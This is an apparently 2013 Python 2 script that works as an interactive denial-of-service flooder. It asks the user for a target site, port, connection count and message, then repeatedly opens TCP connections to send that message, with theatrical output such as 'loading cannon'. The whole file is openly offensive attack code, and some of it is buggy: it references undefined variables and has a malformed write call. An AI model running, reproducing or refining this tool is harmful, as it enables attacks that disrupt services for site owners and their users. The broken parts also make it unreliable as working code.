#!/usr/bin/env python
#
# Script by Steven Grove (@sigwo)
#           www.sigwo.com
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
# Date: 09-24-13

import time
import socket
import sys
import os

def load(left_side, right_side, length, time):
	x = 1
	y = ""
	sys.stdout.write("%i\r" % i)
	while x < length:
		space = length - len(y)
		space = " " * space
		z = left_side + y + space + right_side
		sys.stdout.write("%i\r" % i), z,
		y += "#"
		x += 1

# This is what does the payload delivery
def dos():
	_ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		_ddos.settimeout(.1)
		_ddos.connect((ip, port))
		_ddos.send(deathmsg)
		_ddos.sendto(deathmsg, (ip, port))
		_ddos.send(deathmsg)
		_ddos.close()
	except socket.error, msg:
		print "Failure to connect to host." 

# Iterates over the number of connections you requested			
while quit != 'q':
	host = raw_input("\n" + "Enter the site you wish to hit: ")
	port = int(raw_input("What port do you want to attack? "))
	ip = socket.gethostbyname(host)
		#socket.error return and try to enter the URL again
	conns = int(raw_input("How many connections? "))
	deathmsg = raw_input("What message would you like to send? ")
	print 'Initializing attack sequences'
	print 'I have ' + host + ' [' + ip + ']' + ' in my sights, loading cannon.'
	#import ddos1 #added this
	for i in range(1, conns):
		dos()
		# This is where I had ddos1
		load("|", "|", 10, .01)
	print "\n" + 'Mission Complete!'
	quit = raw_input("\n" + "Press Enter to try another IP or q to exit...")